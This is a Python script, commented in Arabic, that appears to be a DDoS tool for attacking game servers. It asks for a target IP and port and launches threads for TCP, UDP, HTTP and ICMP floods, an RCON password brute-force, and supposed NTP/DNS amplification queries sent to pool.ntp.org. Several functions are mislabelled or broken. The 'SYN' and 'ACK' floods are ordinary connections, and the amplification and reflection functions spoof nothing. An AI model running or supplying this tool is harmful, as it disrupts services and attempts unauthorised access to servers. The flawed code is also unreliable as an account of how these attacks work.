import socket
import threading
import time

# هجوم Fake Player Flooding
def fake_player_flood(target_ip, target_port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.send(b"FakePlayer")
            s.close()
            print(f"[✔] إرسال اتصال Fake Player إلى {target_ip}:{target_port}")
        except Exception as e:
            print(f"[✘] فشل الهجوم: {e}")
            break

# هجوم Connection Spam
def connection_spam(target_ip, target_port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.close()
            print(f"[✔] إرسال اتصال وهمي إلى {target_ip}:{target_port}")
        except Exception as e:
            print(f"[✘] فشل الهجوم: {e}")
            break

# هجوم Packet Flooding
def packet_flooding(target_ip, target_port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(b"Flooding Data", (target_ip, target_port))
            print(f"[✔] إرسال حزمة بيانات ضخمة إلى {target_ip}:{target_port}")
        except Exception as e:
            print(f"[✘] فشل الهجوم: {e}")
            break

# هجوم RCON Brute-force Flood
def rcon_bruteforce_flood(target_ip, target_port, password_list):
    while True:
        for password in password_list:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target_ip, target_port))
                s.send(f"password {password}".encode())
                print(f"[✔] محاولة كلمة مرور RCON: {password}")
            except Exception as e:
                print(f"[✘] فشل الهجوم: {e}")
                break

# هجوم SYN Flooding
def syn_flooding(target_ip, target_port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.send(b"SYN Flood")
            s.close()
            print(f"[✔] إرسال اتصال SYN إلى {target_ip}:{target_port}")
        except Exception as e:
            print(f"[✘] فشل الهجوم: {e}")
            break

# هجوم UDP Flooding
def udp_flooding(target_ip, target_port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(b"UDP Flood", (target_ip, target_port))
            print(f"[✔] إرسال حزمة UDP إلى {target_ip}:{target_port}")
        except Exception as e:
            print(f"[✘] فشل الهجوم: {e}")
            break

# هجوم DNS Amplification
def dns_amplification(target_ip):
    while True:
        try:
            query = b"\x17\x00\x03\x2a\x00\x00\x00\x00\x00\x00\x00\x00"  # طلب NTP مزور
            ntp_server = "pool.ntp.org"  # استخدم خوادم NTP العامة
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(query, (ntp_server, 123))
            print(f"[✔] إرسال طلب DNS إلى {ntp_server} من أجل الهجوم")
        except Exception as e:
            print(f"[✘] فشل الهجوم: {e}")
            break

# هجوم HTTP Flood
def http_flood(target_ip, target_port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.send(b"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n")
            s.close()
            print(f"[✔] إرسال طلب HTTP إلى {target_ip}:{target_port}")
        except Exception as e:
            print(f"[✘] فشل الهجوم: {e}")
            break

# هجوم ACK Flood
def ack_flood(target_ip, target_port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.send(b"ACK Flood Attack!")
            s.close()
            print(f"[✔] إرسال حزمة ACK إلى {target_ip}:{target_port}")
        except Exception as e:
            print(f"[✘] فشل الهجوم: {e}")
            break

# هجوم ICMP Flood
def icmp_flood(target_ip):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            s.sendto(b"\x08\x00\x00\x00\x00\x00\x00\x00", (target_ip, 0))
            print(f"[✔] إرسال حزمة ICMP (ping) إلى {target_ip}")
        except Exception as e:
            print(f"[✘] فشل الهجوم: {e}")
            break

# هجوم Reflection Attack
def reflection_attack(target_ip, target_port, spoofed_ip):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(b"Reflection Attack", (target_ip, target_port))
            print(f"[✔] إرسال طلب مزور إلى {target_ip}:{target_port} باستخدام IP {spoofed_ip}")
        except Exception as e:
            print(f"[✘] فشل الهجوم: {e}")
            break

# هجوم Smurf Attack
def smurf_attack(target_ip):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            s.setsockopt(socket.IPPROTO_ICMP, socket.ICMP_ECHO, 1)
            s.sendto(b"\x08\x00\x00\x00\x00\x00\x00\x00", (target_ip, 0))
            print(f"[✔] إرسال حزم Smurf Attack إلى {target_ip}")
        except Exception as e:
            print(f"[✘] فشل الهجوم: {e}")
            break

# هجوم NTP Amplification
def ntp_amplification(target_ip):
    while True:
        try:
            query = b"\x17\x00\x03\x2a\x00\x00\x00\x00\x00\x00\x00\x00"  # طلب NTP مزور
            ntp_server = "pool.ntp.org"  # استخدم خوادم NTP العامة
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(query, (ntp_server, 123))
            print(f"[✔] إرسال طلب NTP إلى {ntp_server} من أجل الهجوم")
        except Exception as e:
            print(f"[✘] فشل الهجوم: {e}")
            break

# تنفيذ الهجمات بشكل تلقائي
def start_ddos(target_ip, target_port):
    print(f"[✔] بدء الهجوم على السيرفر {target_ip}:{target_port}...")

    # تنفيذ الهجمات بشكل متزامن
    threading.Thread(target=fake_player_flood, args=(target_ip, target_port), daemon=True).start()
    threading.Thread(target=connection_spam, args=(target_ip, target_port), daemon=True).start()
    threading.Thread(target=packet_flooding, args=(target_ip, target_port), daemon=True).start()
    threading.Thread(target=rcon_bruteforce_flood, args=(target_ip, target_port, ["1234", "admin", "password"]), daemon=True).start()
    threading.Thread(target=syn_flooding, args=(target_ip, target_port), daemon=True).start()
    threading.Thread(target=udp_flooding, args=(target_ip, target_port), daemon=True).start()
    threading.Thread(target=dns_amplification, args=(target_ip,), daemon=True).start()
    threading.Thread(target=http_flood, args=(target_ip, target_port), daemon=True).start()
    threading.Thread(target=ack_flood, args=(target_ip, target_port), daemon=True).start()
    threading.Thread(target=icmp_flood, args=(target_ip,), daemon=True).start()
    threading.Thread(target=reflection_attack, args=(target_ip, target_port, "spoofed_ip"), daemon=True).start()
    threading.Thread(target=smurf_attack, args=(target_ip,), daemon=True).start()
    threading.Thread(target=ntp_amplification, args=(target_ip,), daemon=True).start()

# البرنامج الرئيسي
def main():
    print("أدخل معلومات السيرفر:")
    target_ip = input("أدخل عنوان IP للسيرفر: ")
    target_port = int(input("أدخل بورت السيرفر: "))

    print(f"[✔] تنفيذ جميع الهجمات تلقائيًا على السيرفر {target_ip}:{target_port}...")
    start_ddos(target_ip, target_port)

if __name__ == "__main__":
    main()
